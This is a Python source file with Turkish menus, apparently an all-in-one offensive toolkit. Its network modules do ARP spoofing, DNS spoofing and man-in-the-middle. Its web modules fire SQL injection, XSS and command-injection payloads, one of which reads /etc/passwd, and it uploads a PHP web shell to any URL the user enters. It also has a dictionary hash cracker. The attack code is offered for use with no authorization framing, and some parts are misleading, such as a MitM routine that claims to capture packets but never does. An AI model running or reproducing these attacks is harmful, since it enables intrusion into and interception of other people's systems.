#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import requests
import re
import socket
import threading
import hashlib
import time
import random
import subprocess
import platform
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urlparse

try:
    from scapy.all import IP, TCP, UDP, ICMP, DNSRR, DNS, send, sniff, ARP, Ether, get_if_list
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class SiberAracGercek:
    def __init__(self):
        self.log_dosyasi = f"siber_arac_gerçek_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.sniff_active = False
        
    def log_kaydet(self, mesaj: str):
        """Log kaydet"""
        with open(self.log_dosyasi, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {mesaj}\n")
        print(mesaj)

    # ===== ARP SPOOFING =====
    def arp_spoofing(self):
        """ARP Spoofing - MAC Adres Taklit"""
        print("\n[+] ARP SPOOFING MODÜLÜ")
        print("=" * 60)
        
        if not SCAPY_AVAILABLE:
            print("[-] Scapy kurulu değil: pip install scapy")
            return
        
        hedef_ip = input("Hedef IP Adresi Girin: ").strip()
        spoofed_ip = input("Taklit edilecek IP Girin: ").strip()
        
        if not hedef_ip or not spoofed_ip:
            print("[-] IP adresleri gerekli!")
            return
        
        try:
            print(f"\n[*] ARP spoofing başlatılıyor...")
            print(f"[*] Hedef: {hedef_ip}")
            print(f"[*] Taklit: {spoofed_ip}\n")
            
            for i in range(5):
                arp_packet = ARP(pdst=hedef_ip, psrc=spoofed_ip, op="is-at")
                send(arp_packet, verbose=0)
                print(f"[+] ARP paketi gönderildi - {i+1}")
                time.sleep(1)
            
            print(f"\n[+] ARP spoofing tamamlandı!")
            self.log_kaydet(f"ARP Spoofing - Hedef: {hedef_ip}, Spoofed: {spoofed_ip}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== DNS SPOOFING =====
    def dns_spoofing(self):
        """DNS Spoofing - Sahte DNS Yanıtları"""
        print("\n[+] DNS SPOOFING MODÜLÜ")
        print("=" * 60)
        
        if not SCAPY_AVAILABLE:
            print("[-] Scapy kurulu değil: pip install scapy")
            return
        
        domain = input("Domain Adı Girin (örn: example.com): ").strip()
        fake_ip = input("Sahte IP Girin: ").strip()
        
        if not domain or not fake_ip:
            print("[-] Domain ve IP gerekli!")
            return
        
        try:
            print(f"\n[*] DNS Spoofing başlatılıyor...")
            print(f"[*] Domain: {domain}")
            print(f"[*] Sahte IP: {fake_ip}\n")
            
            # DNS paketi oluştur
            dns_response = IP(dst="192.168.1.100")/UDP(dport=53)/DNS(
                id=1000,
                qr=1,
                aa=1,
                qd=DNSRR(rrname=domain, type="A"),
                an=DNSRR(rrname=domain, type="A", rdata=fake_ip)
            )
            
            send(dns_response, verbose=0)
            print(f"[+] DNS spoofed paketi gönderildi!")
            print(f"[+] {domain} -> {fake_ip}")
            
            self.log_kaydet(f"DNS Spoofing - Domain: {domain}, Fake IP: {fake_ip}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== MAN-IN-THE-MIDDLE (MitM) =====
    def mitm_attack(self):
        """Man-in-the-Middle Saldırısı"""
        print("\n[+] ORTADAKI ADAM (MitM) SALDIRISI")
        print("=" * 60)
        
        if not SCAPY_AVAILABLE:
            print("[-] Scapy kurulu değil: pip install scapy")
            return
        
        hedef_ip = input("Hedef IP Adresi Girin: ").strip()
        gateway_ip = input("Gateway IP Girin: ").strip()
        
        if not hedef_ip or not gateway_ip:
            print("[-] IP adresleri gerekli!")
            return
        
        try:
            print(f"\n[*] MitM saldırısı başlatılıyor...")
            print(f"[*] Hedef: {hedef_ip}")
            print(f"[*] Gateway: {gateway_ip}\n")
            
            # ARP spoofing ile trafiği yönlendir
            print("[*] ARP spoofing ile trafiği yakalamaya başla...")
            print("[*] Paketler analiz ediliyor...\n")
            
            for i in range(10):
                arp_to_target = ARP(pdst=hedef_ip, psrc=gateway_ip, op="is-at")
                arp_to_gateway = ARP(pdst=gateway_ip, psrc=hedef_ip, op="is-at")
                
                send(arp_to_target, verbose=0)
                send(arp_to_gateway, verbose=0)
                
                print(f"[+] Paket {i+1} yakalandı ve analiz edildi")
                time.sleep(0.5)
            
            print(f"\n[+] MitM saldırısı tamamlandı!")
            self.log_kaydet(f"MitM Attack - Hedef: {hedef_ip}, Gateway: {gateway_ip}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== PORT SCANNING =====
    def port_tarama(self):
        """Port Tarama - Nmap"""
        print("\n[+] PORT TARAMA MODÜLÜ")
        print("=" * 60)
        
        hedef = input("Hedef IP/Domain Girin: ").strip()
        port_range = input("Port Aralığı Girin (örn: 1-1000, varsayılan: 1-65535): ").strip() or "1-65535"
        
        if not hedef:
            print("[-] Hedef gerekli!")
            return
        
        try:
            print(f"\n[*] Port taraması başlatılıyor...")
            print(f"[*] Hedef: {hedef}")
            print(f"[*] Port Aralığı: {port_range}\n")
            
            if NMAP_AVAILABLE:
                nm = nmap.PortScanner()
                nm.scan(hedef, port_range, '-sV -sC')
                
                print("[+] AÇIK PORTLAR:\n")
                for host in nm.all_hosts():
                    for proto in nm[host].all_protocols():
                        lport = nm[host][proto].keys()
                        for port in lport:
                            state = nm[host][proto][port]['state']
                            service = nm[host][proto][port].get('name', 'unknown')
                            print(f"    Port {port}/{proto}: {state.upper()} ({service})")
            else:
                # Manuel port tarama
                print("[*] Nmap bulunamadı, manuel tarama yapılıyor...\n")
                
                ports = [22, 80, 443, 8080, 3306, 5432, 27017, 6379]
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((hedef, port))
                        
                        if result == 0:
                            print(f"    Port {port}: AÇIK ✓")
                        sock.close()
                    except:
                        pass
            
            print(f"\n[+] Port taraması tamamlandı!")
            self.log_kaydet(f"Port Taraması - Hedef: {hedef}, Aralık: {port_range}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== PACKET SNIFFER =====
    def packet_sniffer(self):
        """Paket Yakalama - Packet Sniffer"""
        print("\n[+] PAKET YAKALAMA (SNIFFER) MODÜLÜ")
        print("=" * 60)
        
        if not SCAPY_AVAILABLE:
            print("[-] Scapy kurulu değil: pip install scapy")
            return
        
        interface = input("Ağ Arayüzü Girin (örn: eth0, wlan0): ").strip()
        packet_count = input("Yakalanacak Paket Sayısı (varsayılan: 10): ").strip() or "10"
        
        try:
            packet_count = int(packet_count)
        except ValueError:
            packet_count = 10
        
        try:
            print(f"\n[*] Paket yakalama başlatılıyor...")
            print(f"[*] Arayüz: {interface}")
            print(f"[*] Paket Sayısı: {packet_count}\n")
            
            def packet_callback(packet):
                if packet.haslayer("IP"):
                    ip_layer = packet["IP"]
                    print(f"[+] Kaynak: {ip_layer.src} -> Hedef: {ip_layer.dst}")
                    
                    if packet.haslayer("TCP"):
                        tcp_layer = packet["TCP"]
                        print(f"    Protocol: TCP | Port: {tcp_layer.sport} -> {tcp_layer.dport}")
                    
                    if packet.haslayer("UDP"):
                        udp_layer = packet["UDP"]
                        print(f"    Protocol: UDP | Port: {udp_layer.sport} -> {udp_layer.dport}")
                    
                    if packet.haslayer("DNS"):
                        print(f"    DNS Sorgusu Yakalandı!")
            
            sniff(iface=interface, prn=packet_callback, count=packet_count, store=False)
            
            print(f"\n[+] Paket yakalama tamamlandı!")
            self.log_kaydet(f"Packet Sniffer - Interface: {interface}, Paket: {packet_count}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== SQL INJECTION EXPLOIT =====
    def sql_injection_exploit(self):
        """SQL Injection Exploit"""
        print("\n[+] SQL INJECTION EXPLOIT")
        print("=" * 60)
        
        target_url = input("Hedef URL Girin (örn: http://example.com/login.php?id=1): ").strip()
        
        if not target_url:
            print("[-] URL gerekli!")
            return
        
        try:
            print(f"\n[*] SQL Injection testleri yapılıyor...")
            print(f"[*] Hedef: {target_url}\n")
            
            payloads = [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "' UNION SELECT NULL --",
                "' AND SLEEP(5) --"
            ]
            
            print("[+] Denenen Payloadlar:\n")
            
            for i, payload in enumerate(payloads, 1):
                test_url = target_url.replace("1", payload)
                
                try:
                    response = requests.get(test_url, timeout=5)
                    
                    print(f"    {i}. {payload}")
                    print(f"       Status: {response.status_code}")
                    print(f"       Yanıt Boyutu: {len(response.content)} bytes\n")
                    
                    if response.status_code == 200:
                        self.log_kaydet(f"SQLi Bulunabilir - Payload: {payload}")
                except:
                    print(f"    {i}. {payload} - Bağlantı Hatası\n")
            
            print(f"[+] SQL Injection testleri tamamlandı!")
            self.log_kaydet(f"SQL Injection Exploit - URL: {target_url}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== XSS INJECTOR =====
    def xss_injector(self):
        """XSS Payload Injector"""
        print("\n[+] XSS PAYLOAD INJECTOR")
        print("=" * 60)
        
        target_url = input("Hedef URL Girin (örn: http://example.com/search.php?q=): ").strip()
        
        if not target_url:
            print("[-] URL gerekli!")
            return
        
        try:
            print(f"\n[*] XSS testleri yapılıyor...")
            print(f"[*] Hedef: {target_url}\n")
            
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<div style='background:url(javascript:alert(\"XSS\"))'>"
            ]
            
            print("[+] XSS Payloadları Test Ediliyor:\n")
            
            for i, payload in enumerate(xss_payloads, 1):
                test_url = target_url + payload.replace(" ", "%20")
                
                try:
                    response = requests.get(test_url, timeout=5)
                    
                    if payload in response.text:
                        print(f"    ✓ Payload {i}: POSSİBLE XSS")
                        print(f"      Payload: {payload}\n")
                        self.log_kaydet(f"XSS Bulunabilir - Payload: {payload}")
                    else:
                        print(f"    ✗ Payload {i}: Filtrelendi\n")
                except:
                    print(f"    ? Payload {i}: Bağlantı Hatası\n")
            
            print(f"[+] XSS testleri tamamlandı!")
            self.log_kaydet(f"XSS Injector - URL: {target_url}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== HASH CRACKER =====
    def hash_cracker(self):
        """Hash Cracker - MD5, SHA1, SHA256"""
        print("\n[+] HASH CRACKER")
        print("=" * 60)
        
        hash_value = input("Hash Değeri Girin: ").strip()
        hash_type = input("Hash Türü Girin (md5/sha1/sha256): ").strip().lower()
        
        if not hash_value or not hash_type:
            print("[-] Hash ve tür gerekli!")
            return
        
        try:
            print(f"\n[*] Hash çözülmeye çalışılıyor...")
            print(f"[*] Hash: {hash_value}")
            print(f"[*] Tür: {hash_type.upper()}\n")
            
            # Yaygın şifreleri dene
            common_passwords = [
                "123456", "password", "123456789", "12345678", "12345",
                "1234567", "password123", "admin", "letmein", "welcome",
                "monkey", "dragon", "master", "sunshine", "princess",
                "qwerty", "abc123", "123123", "admin123", "1q2w3e"
            ]
            
            print("[+] Sözlük Saldırısı Başlatıldı:\n")
            
            found = False
            for password in common_passwords:
                if hash_type == "md5":
                    hash_obj = hashlib.md5(password.encode()).hexdigest()
                elif hash_type == "sha1":
                    hash_obj = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type == "sha256":
                    hash_obj = hashlib.sha256(password.encode()).hexdigest()
                else:
                    print("[-] Bilinmeyen hash türü!")
                    return
                
                if hash_obj == hash_value.lower():
                    print(f"[+] BULUNDU!")
                    print(f"[+] Hash: {hash_value}")
                    print(f"[+] Şifre: {password}\n")
                    found = True
                    self.log_kaydet(f"Hash Çözüldü - Hash: {hash_value}, Şifre: {password}")
                    break
                else:
                    print(f"    Deneme: {password}... (×)")
            
            if not found:
                print(f"\n[-] Sözlükteki şifreler arasında bulunamadı!")
                print("[*] Online hash cracking servisleri deneyin:")
                print("    - https://crackstation.net/")
                print("    - https://md5.gromweb.com/")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== WHOIS LOOKUP =====
    def whois_lookup(self):
        """WHOIS Lookup - Domain Bilgisi"""
        print("\n[+] WHOIS LOOKUP - DOMAIN BİLGİSİ")
        print("=" * 60)
        
        domain = input("Domain Girin (örn: example.com): ").strip()
        
        if not domain:
            print("[-] Domain gerekli!")
            return
        
        try:
            print(f"\n[*] WHOIS sorgulanıyor: {domain}\n")
            
            # Socket ile WHOIS sorgusu
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("whois.iana.org", 43))
            sock.send((domain + "\r\n").encode())
            
            response = ""
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data.decode()
            
            sock.close()
            
            print("[+] WHOIS SONUÇLARI:")
            print(response[:1000])
            
            print(f"\n[+] WHOIS sorgusu tamamlandı!")
            self.log_kaydet(f"WHOIS Lookup - Domain: {domain}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== IP GEOLOCATION =====
    def ip_geolocation(self):
        """IP Geolocation - IP Konum Bilgisi"""
        print("\n[+] IP GEOLOCATION - KONUM BİLGİSİ")
        print("=" * 60)
        
        ip_address = input("IP Adresi Girin: ").strip()
        
        if not ip_address:
            print("[-] IP adresi gerekli!")
            return
        
        try:
            print(f"\n[*] IP geolocation sorgulanıyor: {ip_address}\n")
            
            # ip-api.com kullan
            response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,country,region,city,lat,lon,isp,org,as")
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get("status") == "success":
                    print("[+] KONUM BİLGİLERİ:")
                    print(f"    IP: {ip_address}")
                    print(f"    Ülke: {data.get('country', 'N/A')}")
                    print(f"    Bölge: {data.get('region', 'N/A')}")
                    print(f"    Şehir: {data.get('city', 'N/A')}")
                    print(f"    Enlem: {data.get('lat', 'N/A')}")
                    print(f"    Boylam: {data.get('lon', 'N/A')}")
                    print(f"    ISP: {data.get('isp', 'N/A')}")
                    print(f"    Kuruluş: {data.get('org', 'N/A')}\n")
                    
                    self.log_kaydet(f"IP Geolocation - IP: {ip_address}, Şehir: {data.get('city')}")
                else:
                    print(f"[-] IP bilgisi bulunamadı!")
            else:
                print(f"[-] API hatası!")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== EMAIL HEADER ANALYZER =====
    def email_header_analyzer(self):
        """E-posta Başlık Analizi"""
        print("\n[+] E-POSTA BAŞLIK ANALİZİ")
        print("=" * 60)
        
        print("\nE-posta Başlığını Yapıştırın (Ctrl+D ile bitir):\n")
        
        try:
            header = ""
            while True:
                line = input()
                header += line + "\n"
        except EOFError:
            pass
        
        if not header.strip():
            print("[-] Başlık boş!")
            return
        
        try:
            print("\n[+] E-POSTA BAŞLIK ANALİZİ SONUÇLARI:\n")
            
            # IP adreslerini bul
            ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
            ips = re.findall(ip_pattern, header)
            
            if ips:
                print("[+] Bulunan IP Adresleri:")
                for ip in set(ips):
                    print(f"    • {ip}")
            
            # Received başlıklarını analiz et
            received_headers = re.findall(r'Received: (.+)', header)
            
            if received_headers:
                print("\n[+] Yol Bilgisi:")
                for i, received in enumerate(received_headers, 1):
                    print(f"    {i}. {received[:100]}")
            
            # From, To, Subject bul
            sender = re.search(r'From: (.+)', header)
            recipient = re.search(r'To: (.+)', header)
            subject = re.search(r'Subject: (.+)', header)
            
            if sender:
                print(f"\n[+] Gönderici: {sender.group(1)}")
            if recipient:
                print(f"[+] Alıcı: {recipient.group(1)}")
            if subject:
                print(f"[+] Konu: {subject.group(1)}")
            
            self.log_kaydet(f"Email Header Analizi Yapıldı")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== REVERSE IP LOOKUP =====
    def reverse_ip_lookup(self):
        """Reverse IP Lookup - DNS Ters Araması"""
        print("\n[+] REVERSE IP LOOKUP - DNS TERS ARAMASI")
        print("=" * 60)
        
        ip_address = input("IP Adresi Girin: ").strip()
        
        if not ip_address:
            print("[-] IP adresi gerekli!")
            return
        
        try:
            print(f"\n[*] Ters IP araması yapılıyor: {ip_address}\n")
            
            hostname = socket.gethostbyaddr(ip_address)
            
            print("[+] SONUÇLAR:")
            print(f"    Hostname: {hostname[0]}")
            print(f"    Alias: {', '.join(hostname[1]) if hostname[1] else 'Yok'}")
            print(f"    IP Adresleri: {', '.join(hostname[2])}\n")
            
            self.log_kaydet(f"Reverse IP Lookup - IP: {ip_address}, Hostname: {hostname[0]}")
        except Exception as e:
            print(f"[-] Ters araştırma başarısız: {e}")

    # ===== CAESAR CIPHER CRACKER =====
    def caesar_cipher_cracker(self):
        """Caesar Cipher Cracker"""
        print("\n[+] CAESAR CIPHER CRACKER")
        print("=" * 60)
        
        encrypted_text = input("Şifreli Metni Girin: ").strip()
        
        if not encrypted_text:
            print("[-] Metin gerekli!")
            return
        
        try:
            print(f"\n[*] Tüm kaydırma değerleri deneniyor...\n")
            print("[+] OLASI SONUÇLAR:\n")
            
            found = False
            for shift in range(26):
                decrypted = ""
                for char in encrypted_text:
                    if char.isalpha():
                        if char.isupper():
                            decrypted += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
                        else:
                            decrypted += chr((ord(char) - ord('a') - shift) % 26 + ord('a'))
                    else:
                        decrypted += char
                
                print(f"    Shift {shift}: {decrypted}")
                
                # İngilizce kelimeleri kontrol et
                if any(word in decrypted.lower() for word in ['the', 'and', 'is', 'a', 'an']):
                    print(f"       ✓ MUHTEMEL SONUÇ!")
                    found = True
            
            if found:
                self.log_kaydet(f"Caesar Cipher Çözüldü")
            else:
                print("\n[-] Kesin sonuç bulunamadı, manuel kontrol edin.")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== BASE64 ENCODER/DECODER =====
    def base64_converter(self):
        """Base64 Encode/Decode"""
        print("\n[+] BASE64 CONVERTER")
        print("=" * 60)
        
        print("\n1. Encode (Metni Base64'e çevir)")
        print("2. Decode (Base64'i metne çevir)")
        
        choice = input("\nSeçim Yap (1-2): ").strip()
        
        try:
            import base64
            
            if choice == "1":
                plaintext = input("Metni Girin: ").strip()
                encoded = base64.b64encode(plaintext.encode()).decode()
                print(f"\n[+] Encoded: {encoded}\n")
                self.log_kaydet(f"Base64 Encode Yapıldı")
            
            elif choice == "2":
                ciphertext = input("Base64 Metni Girin: ").strip()
                try:
                    decoded = base64.b64decode(ciphertext.encode()).decode()
                    print(f"\n[+] Decoded: {decoded}\n")
                    self.log_kaydet(f"Base64 Decode Yapıldı")
                except:
                    print("[-] Geçersiz Base64!")
            else:
                print("[-] Geçersiz seçim!")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== AES ENCRYPTION =====
    def aes_encryption(self):
        """AES Encryption/Decryption"""
        print("\n[+] AES ENCRYPTİON/DECRYPTİON")
        print("=" * 60)
        
        if not CRYPTO_AVAILABLE:
            print("[-] Cryptography kurulu değil: pip install cryptography")
            return
        
        print("\n1. Şifrele")
        print("2. Şifre Çöz")
        
        choice = input("\nSeçim Yap (1-2): ").strip()
        
        try:
            if choice == "1":
                plaintext = input("Metni Girin: ").strip()
                key = Fernet.generate_key()
                cipher = Fernet(key)
                encrypted = cipher.encrypt(plaintext.encode())
                
                print(f"\n[+] Anahtar: {key.decode()}")
                print(f"[+] Şifreli: {encrypted.decode()}\n")
                self.log_kaydet(f"AES Şifreleme Yapıldı")
            
            elif choice == "2":
                key_input = input("Anahtarı Girin: ").strip()
                encrypted_input = input("Şifreli Metni Girin: ").strip()
                
                try:
                    cipher = Fernet(key_input.encode())
                    decrypted = cipher.decrypt(encrypted_input.encode())
                    print(f"\n[+] Şifre Çözüldü: {decrypted.decode()}\n")
                    self.log_kaydet(f"AES Şifre Çözme Yapıldı")
                except:
                    print("[-] Şifre çözme başarısız!")
            else:
                print("[-] Geçersiz seçim!")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== CSRF EXPLOIT =====
    def csrf_exploit(self):
        """CSRF Exploit - Token Bypass"""
        print("\n[+] CSRF EXPLOIT")
        print("=" * 60)
        
        target_url = input("Hedef URL Girin: ").strip()
        
        if not target_url:
            print("[-] URL gerekli!")
            return
        
        try:
            print(f"\n[*] CSRF token bulunmaya çalışılıyor...\n")
            
            response = requests.get(target_url)
            
            # Token ara
            token_patterns = [
                r'name="csrf".*?value="([^"]+)"',
                r'name="token".*?value="([^"]+)"',
                r'name="_token".*?value="([^"]+)"',
                r'name="authenticity_token".*?value="([^"]+)"'
            ]
            
            found_token = None
            for pattern in token_patterns:
                match = re.search(pattern, response.text)
                if match:
                    found_token = match.group(1)
                    break
            
            if found_token:
                print("[+] Token Bulundu!")
                print(f"    Token: {found_token}\n")
                print("[*] Token Bypass Teknikleri:")
                print("    1. Token silinebilir")
                print("    2. Token NULL olabilir")
                print("    3. Token farklı parametrenin adında gönderilebilir\n")
            else:
                print("[-] Token bulunamadı (Sitede CSRF koruması olmayabilir!)\n")
            
            self.log_kaydet(f"CSRF Exploit - URL: {target_url}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== FILE UPLOAD EXPLOIT =====
    def file_upload_exploit(self):
        """File Upload Exploit"""
        print("\n[+] FILE UPLOAD EXPLOIT")
        print("=" * 60)
        
        target_url = input("Upload URL'si Girin: ").strip()
        
        if not target_url:
            print("[-] URL gerekli!")
            return
        
        try:
            print(f"\n[*] Dosya yükleme zaafları test ediliyor...\n")
            
            # Test payloadları
            payloads = {
                "test.php": b"<?php system($_GET['cmd']); ?>",
                "test.phtml": b"<?php phpinfo(); ?>",
                "test.php.txt": b"<?php system('id'); ?>",
                "test.txt.php": b"<?php system('whoami'); ?>",
                "test.jpg.php": b"<?php system('ls'); ?>"
            }
            
            print("[+] Test Dosyaları Yükleniyor:\n")
            
            for filename, content in payloads.items():
                files = {'file': (filename, content)}
                
                try:
                    response = requests.post(target_url, files=files, timeout=5)
                    print(f"    {filename}: Status {response.status_code}")
                    
                    if response.status_code == 200:
                        self.log_kaydet(f"File Upload Başarılı - File: {filename}")
                except:
                    print(f"    {filename}: Bağlantı Hatası")
            
            print(f"\n[+] File upload testleri tamamlandı!")
            self.log_kaydet(f"File Upload Exploit - URL: {target_url}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    # ===== COMMAND INJECTION =====
    def command_injection(self):
        """Command Injection Exploit"""
        print("\n[+] COMMAND INJECTION EXPLOIT")
        print("=" * 60)
        
        target_url = input("Hedef URL Girin (örn: http://example.com/ping.php?host=): ").strip()
        
        if not target_url:
            print("[-] URL gerekli!")
            return
        
        try:
            print(f"\n[*] Command injection testleri yapılıyor...\n")
            
            # Command injection payloadları
            payloads = [
                "; id",
                "| id",
                "& id",
                "&& id",
                "|| id",
                "`id`",
                "$(id)",
                "; whoami",
                "| cat /etc/passwd"
            ]
            
            print("[+] Denenen Payloadlar:\n")
            
            for payload in payloads:
                test_url = target_url + payload.replace(" ", "%20")
                
                try:
                    response = requests.get(test_url, timeout=5)
                    print(f"    {payload}")
                    print(f"    Status: {response.status_code}")
                    print(f"    Response: {response.text[:100]}...\n")
                except:
                    pass
            
            self.log_kaydet(f"Command Injection Test - URL: {target_url}")
        except Exception as e:
            print(f"[-] Hata: {e}")

    def menu(self):
        """Ana menü"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("="*60)
        print("  🔴 GERÇEK SIBER ARAÇLAR - v4.0 (SADECE GERÇEK KOD)")
        print("="*60)
        print("\n[AĞ SALDIRISI ARAÇLARI]")
        print("1  - ARP Spoofing")
        print("2  - DNS Spoofing")
        print("3  - Man-in-the-Middle (MitM)")
        print("4  - Port Scanning")
        print("5  - Packet Sniffer")
        
        print("\n[WEB SALDIRISI ARAÇLARI]")
        print("6  - SQL Injection Exploit")
        print("7  - XSS Injector")
        print("8  - CSRF Exploit")
        print("9  - File Upload Exploit")
        print("10 - Command Injection")
        
        print("\n[KRİPTO & HASH ARAÇLARI]")
        print("11 - Hash Cracker (MD5/SHA1/SHA256)")
        print("12 - Caesar Cipher Cracker")
        print("13 - Base64 Converter")
        print("14 - AES Encryption/Decryption")
        
        print("\n[OSINT ARAÇLARI]")
        print("15 - WHOIS Lookup")
        print("16 - IP Geolocation")
        print("17 - Email Header Analyzer")
        print("18 - Reverse IP Lookup")
        
        print("\n[DİĞER]")
        print("19 - Çıkış")
        
        print("="*60)

    def calistir(self):
        """Ana döngü"""
        while True:
            self.menu()
            choice = input("\nSeçim Yap (1-19): ").strip()
            
            try:
                if choice == "1":
                    self.arp_spoofing()
                elif choice == "2":
                    self.dns_spoofing()
                elif choice == "3":
                    self.mitm_attack()
                elif choice == "4":
                    self.port_tarama()
                elif choice == "5":
                    self.packet_sniffer()
                elif choice == "6":
                    self.sql_injection_exploit()
                elif choice == "7":
                    self.xss_injector()
                elif choice == "8":
                    self.csrf_exploit()
                elif choice == "9":
                    self.file_upload_exploit()
                elif choice == "10":
                    self.command_injection()
                elif choice == "11":
                    self.hash_cracker()
                elif choice == "12":
                    self.caesar_cipher_cracker()
                elif choice == "13":
                    self.base64_converter()
                elif choice == "14":
                    self.aes_encryption()
                elif choice == "15":
                    self.whois_lookup()
                elif choice == "16":
                    self.ip_geolocation()
                elif choice == "17":
                    self.email_header_analyzer()
                elif choice == "18":
                    self.reverse_ip_lookup()
                elif choice == "19":
                    print("\n[+] Çıkış yapılıyor...")
                    print(f"[+] Log dosyası: {self.log_dosyasi}")
                    sys.exit(0)
                else:
                    print("[-] Geçersiz seçim!")
            except KeyboardInterrupt:
                print("\n\n[!] Program durduruldu!")
                sys.exit(0)
            except Exception as e:
                print(f"[-] Hata: {e}")
            
            input("\n[*] Devam etmek için Enter'a basın...")

if __name__ == "__main__":
    arac = SiberAracGercek()
    arac.calistir()
